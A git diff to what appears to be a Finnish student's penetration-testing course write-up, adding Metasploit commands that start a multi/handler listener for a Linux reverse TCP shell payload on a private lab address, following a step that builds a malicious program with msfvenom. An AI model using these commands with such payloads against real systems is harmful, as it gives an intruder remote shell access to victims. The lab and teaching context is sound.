@@ -255,6 +255,12 @@ Luodaan msfvenomilla haitta ohjelma:
 
 ![image](https://github.com/SakuKarp/Tunkeutumistestaus/assets/148875105/e348327c-2f74-4576-8877-574feac98e2d)
 
+    msfconsol # konsoli
+    use exploit/multi/handler # määritetään asetukset
+    set PAYLOAD linux/x64/shell_reverse_tcp # määrittää payloadin 
+    set LHOST 192.168.1.10 # määrittää hostin
+    set LPORT 4444 # määrittää portin
+    run # käynnistää kuuntelijan
 
 
 ## f) Asenna Windows virtuaalikoneeseen. Voi olla esimerkiksi Metasploitable 3 tai Microsoftin sivuilta saatava ilmainen kokeiluversio.
